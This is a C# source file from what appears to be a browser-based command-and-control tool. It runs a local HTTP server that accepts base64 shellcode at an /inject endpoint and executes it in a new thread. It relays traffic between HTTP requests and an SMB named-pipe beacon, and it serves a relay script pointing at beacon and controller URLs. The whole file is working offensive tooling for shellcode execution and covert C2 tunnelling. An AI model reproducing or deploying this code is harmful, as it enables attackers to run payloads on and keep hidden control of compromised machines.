using System;
using System.Net;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.IO;
using System.Reflection;
namespace Browser_C2
{
    public class HTTP
    {
       public  bool is64Bit = IntPtr.Size == 8;
        public string AllowedOrigin;
        public string Prefix;
        
        

        public void StartServer() {

            SMBPipe _pipe = new SMBPipe();
            _pipe.PipeName = Program.PipeName;

            HttpListener listener = new HttpListener();
            listener.Prefixes.Add(Prefix);
            listener.Start();
            Browser.StartBrowser();
            while (true)
            {
                byte[] responseString=Encoding.ASCII.GetBytes("DEF"); ;
                HttpListenerContext context = listener.GetContext();
                HttpListenerRequest request = context.Request;
                HttpListenerResponse response = context.Response;

                if(request.HttpMethod == "POST")
                {
                    // This will send the data to the SMB beacon that is running.
                    Stream postData = request.InputStream;
                    StreamReader reader = new StreamReader(postData);
                    String data = reader.ReadToEnd();

                    if (request.Url.AbsolutePath == "/inject")
                    {
                        // Inject the shellcode
                        Shellcode loader = new Shellcode();
                        loader.shellcode = System.Convert.FromBase64String(data);
                        Thread ShellcodeThread = new Thread(new ThreadStart(loader.LoadShellcode));
                        ShellcodeThread.Start();
                        
                        _pipe.ConnectToPipe();
                        if (_pipe.client.IsConnected)
                        {
                            responseString = Encoding.ASCII.GetBytes(Convert.ToBase64String(_pipe.GetData()));
                        }
                        

                    }
                    else if (request.Url.AbsolutePath == "/send/")
                    {
                        // Send data to pipe and then send the response back to the HTTP request that is making this
                        byte[] _data = System.Convert.FromBase64String(data);
                        if (!_pipe.client.IsConnected)
                        {
                            _pipe.ConnectToPipe();
                         }

                       // Console.WriteLine("Got Response from server writing to pipe: " + data);

                        if (_data.Length > 0)
                        {
                            _pipe.SendData(_data);
                        }
          

                    }
                   
                    else
                    {
                          responseString = Encoding.ASCII.GetBytes("404 Not Found POST");
                    }

                }
                else if (request.HttpMethod == "GET"){
          
                    if (request.Url.AbsolutePath == "/arch")
                    {
                        responseString = is64Bit ? Encoding.ASCII.GetBytes("x64") : Encoding.ASCII.GetBytes("x86");
                    } else if(request.Url.AbsolutePath == "/ping") {
                        responseString = Encoding.ASCII.GetBytes("alive");
                    }
                    else if (request.Url.AbsolutePath == "/receive/")
                    {

                        if (_pipe.client.IsConnected)
                        {
                            responseString = Encoding.ASCII.GetBytes(Convert.ToBase64String(_pipe.GetData()));
                        }

                    }
                    else if (request.Url.AbsolutePath == "/relay/")
                    {

                        responseString = Encoding.ASCII.GetBytes(Files.relay.Replace("BEACON_URL", Program.BeaconURL).Replace("CONTROLLER_URL",Program.ControllerURL));




                    }


                    else
                    {
                        responseString = Encoding.ASCII.GetBytes("404 Not Found");
                    }
                   
                }

                response.AddHeader("Access-Control-Allow-Origin", AllowedOrigin);
                response.AddHeader("Cache-Control", "private, max-age=0");
                response.AddHeader("Pragma", "no-cache");

                byte[] buffer = responseString; //System.Text.Encoding.UTF8.GetBytes(responseString);
                // Get a response stream and write the response to it.
                response.ContentLength64 = buffer.Length;
                System.IO.Stream output = response.OutputStream;
                output.Write(buffer, 0, buffer.Length);
                output.Close();

            }

        }
    }
}
